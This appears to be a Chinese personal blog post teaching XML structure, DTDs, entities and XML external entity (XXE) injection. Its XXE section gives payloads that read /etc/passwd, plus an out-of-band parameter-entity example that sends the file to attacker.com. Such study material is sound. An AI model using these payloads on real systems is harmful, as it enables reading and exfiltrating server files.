@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>XXE 漏洞学习 | Bubble&#39;s blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="">
+<meta name="generator" content="Hugo 0.128.2">
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+ 
+  
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=your-google-analytics-id"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'your-google-analytics-id');
+        }
+      </script>
+    
+  
+
+
+
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+    
+        <a href="/"> <span class="arrow">←</span>Home</a>
+    
+    <a href="/posts">Archive</a>
+    <a href="/tags">Tags</a>
+    <a href="/about">About</a>
+    <a href="/friend">friend</a>
+
+    
+
+    
+        
+        
+    
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">XXE 漏洞学习</h1>
+
+    <div class="tip">
+        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">Jan 1, 0001</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          3125 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          7 minute read
+        </span>
+    </div>
+
+    
+    
+        
+  
+
+
+    
+
+
+    <div class="content">
+      <h2 id="一xml基础"><strong>一.XML基础</strong> <a href="#%e4%b8%80xml%e5%9f%ba%e7%a1%80" class="anchor">🔗</a></h2><p>XML 全称为 Extensible Markup Language ，即可扩展标记型语言。XML 被设计为传输和存储数据，聚焦于数据的内容。其文档结构包括 <strong>XML 声明 、DTD 文档类型定义以及文档元素</strong> 。</p>
+<p>所有的XML文档都由<strong>元素（Elements）、属性（Attributes）、实体（Entities）、PCDATA（Parsed Character Data，即解析的字符数据）和CDATA(Character Data，即字符数据)</strong> 这些构建模块组成。</p>
+<p>示例XML文档：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">&lt;!-- XML 声明，指定了XML的版本和文档的字符编码 --&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!-- DTD 文档类型定义，定义了catalog文档的结构 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT catalog (product+)&gt;</span> <span style="color:#080;font-style:italic">&lt;!-- catalog元素包含一个或多个product元素 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT product (name, description)&gt;</span> <span style="color:#080;font-style:italic">&lt;!-- product元素包含name和description元素 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT name (#PCDATA)&gt;</span> <span style="color:#080;font-style:italic">&lt;!-- name元素包含解析的字符数据 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT description (#PCDATA | CDATA_SECTION)*&gt;</span> <span style="color:#080;font-style:italic">&lt;!-- description元素可以包含解析的字符数据或CDATA部分 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ATTLIST product id CDATA #REQUIRED&gt;</span> <span style="color:#080;font-style:italic">&lt;!-- product元素有一个必需的id属性 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ENTITY productname &#34;SuperWidget 2000&#34;&gt;</span> <span style="color:#080;font-style:italic">&lt;!-- 定义了一个名为productname的实体 --&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;  
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">&lt;!-- 文档元素，即catalog元素，它是整个XML文档的根元素 --&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;catalog&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;product</span> <span style="color:#b44">id=</span><span style="color:#b44">&#34;123&#34;</span><span style="color:#008000;font-weight:bold">&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">&lt;!-- 使用实体引用插入产品名称 --&gt;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;name&gt;</span><span style="color:#999;font-weight:bold">&amp;productname;</span><span style="color:#008000;font-weight:bold">&lt;/name&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;description&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">&lt;!-- 使用CDATA部分来包含包含特殊字符的文本 --&gt;</span>  
+</span></span><span style="display:flex;"><span>            <span style="color:#080">&lt;![CDATA[This is a &lt;special&gt; product with &amp; characters.]]&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;/description&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/product&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/catalog&gt;</span>
+</span></span></code></pre></div><p><strong>1. 元素：</strong> 元素是XML文档的基本构建块，在上面的例子中，<code>&lt;catalog&gt;, &lt;product&gt;, &lt;name&gt;, 和 &lt;description&gt; </code>都是元素。</p>
+<p><strong>2. 属性：</strong> 属性提供了元素的额外信息，它们位于元素的开始标签中。在上面的例子中，<code>&lt;product&gt; </code>元素有一个 id 属性，其值为 123 。</p>
+<p><strong>3. 实体：</strong> 实体是XML中用于表示预定义数据的一种方式。它们可以在XML文档中被引用，而不是直接写入。</p>
+<p>在上面的例子中，定义了一个名为<code>productname</code>的内部实体，其值为<code> SuperWidget 2000</code>。在<code>&lt;name&gt;</code>元素中，通过<code> &amp;productname;</code> 引用了这个实体。</p>
+<p><strong>4. PCDATA:</strong> PCDATA是XML文档中被解析的字符数据。它包含文本，这些文本会被解析器检查以查找标记、实体引用等。</p>
+<p>在上面的例子中,<code>&lt;name&gt; </code>元素中的<code>&amp;productname;</code>实体引用在解析时会被替换为 SuperWidget 2000，但替换后的文本仍然是PCDATA的一部分。</p>
+<p><strong>5. CDATA:</strong> CDATA部分用于告诉解析器忽略其中的标记、实体引用等，将其视为纯文本,CDATA部分是通过特定的语法（<![CDATA[...]]>）来标记的。</p>
+<p>在上面的例子中，<code>&lt;description&gt; </code>元素使用了CDATA部分来包含包含特殊字符（如 &lt; 和 &amp;）的文本。这样，这些特殊字符就不会被解析器解释为标记或实体引用了。</p>
+<h2 id="dtd内部声明和外部引用"><strong>DTD内部声明和外部引用</strong> <a href="#dtd%e5%86%85%e9%83%a8%e5%a3%b0%e6%98%8e%e5%92%8c%e5%a4%96%e9%83%a8%e5%bc%95%e7%94%a8" class="anchor">🔗</a></h2><p>在XML中，DTD（Document Type Definition，文档类型定义）可以通过两种主要方式被声明：<strong>内部声明和外部引用</strong>。这两种方式在语法上有所不同，但它们都用于为XML文档提供验证规则和结构定义。</p>
+<p><strong>内部声明</strong></p>
+<p>内部声明是指将DTD直接嵌入到XML文档的<!DOCTYPE>声明中。这种方式适用于DTD内容相对较短或不需要被多个文档共享的情况。内部声明的语法如下：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE root-element [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!ELEMENT element-name (element-content)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">&lt;!-- 其他元素、属性、实体等声明 --&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>其中，root-element是XML文档的根元素名称，element-name是你要声明的元素名称，而element-content则定义了该元素的内容模型（即它可以包含什么）。注意，内部声明中的DTD是直接包含在方括号[]中的。</p>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!ELEMENT catalog (product*)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT product (name, description)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT name (#PCDATA)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT description (#PCDATA)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ATTLIST product id CDATA #REQUIRED&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ENTITY productname &#34;SuperWidget 2000&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;catalog&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;product</span> <span style="color:#b44">id=</span><span style="color:#b44">&#34;123&#34;</span><span style="color:#008000;font-weight:bold">&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;name&gt;</span><span style="color:#999;font-weight:bold">&amp;productname;</span><span style="color:#008000;font-weight:bold">&lt;/name&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;description&gt;</span>A widget that does super things.<span style="color:#008000;font-weight:bold">&lt;/description&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/product&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/catalog&gt;</span>
+</span></span></code></pre></div><p><strong>外部引用</strong></p>
+<p>外部引用是指通过<!DOCTYPE>声明来引用一个外部的DTD文件。这种方式适用于DTD内容较长或需要被多个文档共享的情况。外部引用的语法有两种形式：<strong>SYSTEM和PUBLIC。</strong></p>
+<p><strong>1. SYSTEM</strong></p>
+<p>SYSTEM用于引用本地系统或网络上的DTD文件。它的语法如下：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE root-element SYSTEM &#34;URI&#34;&gt;</span>
+</span></span></code></pre></div><p>其中URI是DTD文件的统一资源标识符（如文件路径或URL）。</p>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog SYSTEM &#34;catalog.dtd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;catalog&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">&lt;!-- XML文档内容 --&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/catalog&gt;</span>
+</span></span></code></pre></div><p>在这个例子中，XML解析器会查找与catalog.dtd相匹配的DTD文件，并根据其中的定义来验证XML文档的结构。</p>
+<p><strong>2. PUBLIC</strong></p>
+<p>PUBLIC用于引用通过公共标识符（如ISO标准号）和可能的系统标识符（如URI）指定的DTD。它的语法如下：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE root-element PUBLIC &#34;public-identifier&#34; &#34;URI&#34;&gt;</span>
+</span></span></code></pre></div><p>但请注意，并不是所有的XML处理器都会实际使用public-identifier来查找DTD，它主要用于文档化或作为DTD的标识符。通常，你仍然需要提供URI来实际定位DTD文件。</p>
+<p>示例:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog PUBLIC &#34;-//MyCompany//DTD Catalog//EN&#34; &#34;catalog.dtd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;catalog&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">&lt;!-- XML文档内容 --&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/catalog&gt;</span>
+</span></span></code></pre></div><p><strong>DTD实体</strong></p>
+<p>DTD 实体是用于定义引用普通文本或特殊字符的快捷方式的变量，提高代码的复用性。实体分为 <strong>一般实体</strong> 和 <strong>参数实体</strong> 。</p>
+<p><strong>一般实体（普通实体）</strong>：</p>
+<p>一般实体用于在DTD或XML文档中定义一段可重用的文本。它可以在XML文档中被引用，并在解析时被替换为其实体值。一般实体可以在DTD中内部声明，也可以外部声明。</p>
+<ol>
+<li>内部一般实体示例:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!ENTITY productname &#34;SuperWidget 2000&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT catalog (product*)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT product (name, description)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT name (#PCDATA)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT description (#PCDATA)&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>在XML文档中使用该实体：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;catalog&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;product&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;name&gt;</span><span style="color:#999;font-weight:bold">&amp;productname;</span><span style="color:#008000;font-weight:bold">&lt;/name&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;description&gt;</span>A widget that does super things.<span style="color:#008000;font-weight:bold">&lt;/description&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/product&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/catalog&gt;</span>
+</span></span></code></pre></div><p>在这个例子中，<code>&amp;productname;</code> 是一般实体的引用，它会被替换为在DTD中定义的 SuperWidget 2000。</p>
+<ol start="2">
+<li>外部一般实体示例:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog SYSTEM &#34;catalog.dtd&#34; [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!ENTITY copyright SYSTEM &#34;copyright.txt&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>注意：外部实体的声明通常不会直接嵌入在 <!DOCTYPE> 声明中，而是单独存放在一个外部DTD文件中。</p>
+<p>在XML文档中使用该实体：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;catalog&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;product&gt;</span>  
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">&lt;!-- 其他元素 --&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/product&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;copyright&gt;</span><span style="color:#999;font-weight:bold">&amp;copyright;</span><span style="color:#008000;font-weight:bold">&lt;/copyright&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;/catalog&gt;</span>
+</span></span></code></pre></div><p>在这个例子中，<code>&amp;copyright; </code>是一般实体的引用，它会被替换为 copyright.txt 文件中的内容。</p>
+<p><strong>参数实体</strong></p>
+<p>参数实体主要用于在DTD中声明，然后在DTD的其他部分或另一个DTD中被引用。*它们不能直接在XML文档中被引用。*参数实体通常用于定义可以复用的元素声明、属性列表或其他DTD结构的片段。</p>
+<p>参数实体示例：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE catalog [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!ENTITY % productContent &#34;(name, description, price?)&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT catalog (product*)&gt;</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#080">&lt;!ELEMENT product %productContent;&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>在这个例子中，<code>%productContent;</code> 是一个参数实体，它定义了一个内容模型片段，即 <code>product </code>元素可以包含<code> name、description 和可选的 price 元素。</code>然后，这个参数实体在 product 元素的声明中被引用，以指定其内容模型。</p>
+<h2 id="二xml外部实体注入xxe"><strong>二.XML外部实体注入（XXE）</strong> <a href="#%e4%ba%8cxml%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e6%b3%a8%e5%85%a5xxe" class="anchor">🔗</a></h2><p>XXE 攻击是许多基于注入的攻击方式之一，攻击者将 XML 文档中<em>外部实体发送到应用程序中并使用 XML 解析器解析</em>时就会发生这种攻击。</p>
+<p>常见XXE注入方式有以下三种：</p>
+<p><strong>1. 直接通过DTD外部实体声明</strong></p>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE a [  
+</span></span></span><span style="display:flex;"><span><span style="color:#080">    &lt;!ENTITY b SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span>]&gt;  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;a&gt;</span><span style="color:#999;font-weight:bold">&amp;b;</span><span style="color:#008000;font-weight:bold">&lt;/a&gt;</span>
+</span></span></code></pre></div><p>通过声明一个外部实体b，其系统标识符（SYSTEM）指向了服务器的/etc/passwd文件。当XML处理器解析这个XML文档时，它会尝试从指定的URI加载外部内容，并将这些内容插入到XML文档中。因此，/etc/passwd文件的内容将被插入到<a>标签中，并可能被返回给攻击者。</p>
+<p><strong>2. 通过DTD外部实体声明引入外部DTD文档</strong></p>
+<p>这种方式下，攻击者首先在外部DTD文档中声明外部实体，然后在XML文档中通过DOCTYPE声明引入这个外部DTD文档。</p>
+<p>示例：</p>
+<p>external.dtd文件：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span></code></pre></div><p>XML文件：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE a SYSTEM &#34;http://example.com/external.dtd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;a&gt;</span><span style="color:#999;font-weight:bold">&amp;xxe;</span><span style="color:#008000;font-weight:bold">&lt;/a&gt;</span>
+</span></span></code></pre></div><p>当XML处理器解析这个XML文档时，它会先加载external.dtd文件，然后解析其中的实体声明，最终将/etc/passwd文件的内容插入到XML文档中。</p>
+<p><strong>3. 利用参数实体进行XXE注入</strong></p>
+<p>示例：</p>
+<p>external.dtd文件：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://attacker.com/?data=%file;&#39;&gt;</span>&#34;&gt;  
+</span></span><span style="display:flex;"><span>%all;
+</span></span></code></pre></div><p>XML文件：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#080">&lt;?xml version=&#34;1.0&#34;?&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#080">&lt;!DOCTYPE a SYSTEM &#34;http://example.com/external.dtd&#34;&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;a&gt;</span><span style="color:#999;font-weight:bold">&amp;send;</span><span style="color:#008000;font-weight:bold">&lt;/a&gt;</span>
+</span></span></code></pre></div><p>当XML处理器解析这个XML文档时，它会加载<code>external.dtd</code>文件，并解析其中的参数实体声明。由于<code>%all;</code>在DTD中被引用，它会展开为send实体的声明。最后，当XML处理器遇到<code>&amp;send;</code>时，它会尝试从指定的URL加载外部内容，并将URL中的<code>%file;</code>替换为<code>/etc/passwd</code>文件的内容。</p>
+<p>参考：
+<a href="https://sinhub.cn/2020/11/xxe-learning/" target="_blank" rel="noopener">https://sinhub.cn/2020/11/xxe-learning/</a></p>
+    </div>
+
+    
+    
+    
+  <div id="comment">
+    
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+
+
+</section>
+
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/bubbleo0O" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="your-stackoverflow-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>stackoverflow</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-488.000000, -1163.000000)">
+            <g id="stackoverflow" transform="translate(488.000000, 1163.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M42.0860128,53.5922927 L22.9745951,53.6011499 L22.9729497,49.5538824 L42.0835447,49.5440929 L42.0860128,53.5922927 L42.0860128,53.5922927 Z M55,30.6708298 L51.7306912,12 L47.7087256,12.6920259 L50.9775643,31.3628557 L55,30.6708298 L55,30.6708298 Z M42.5455518,44.3547147 L23.5156994,42.616026 L23.1410164,46.6470941 L42.1712214,48.3841513 L42.5455518,44.3547147 L42.5455518,44.3547147 Z M43.8009984,39.0731519 L25.3459811,34.1539179 L24.285633,38.0621508 L42.7419431,42.9819676 L43.8009984,39.0731519 L43.8009984,39.0731519 Z M46.2103463,34.4436411 L29.7494464,24.8164635 L27.6748215,28.3015328 L44.1365441,37.9292931 L46.2103463,34.4436411 L46.2103463,34.4436411 Z M50.2466504,31.6088756 L46.8745036,33.8883189 L36.106599,18.2318456 L39.4792159,15.9517031 L50.2466504,31.6088756 Z M45.3315807,40.2784283 L48.5799693,40.2784283 L48.5799693,60 L17,60 L17,40.2784283 L20.2648427,40.2784283 L20.2648427,56.8243495 L45.3315807,56.8243495 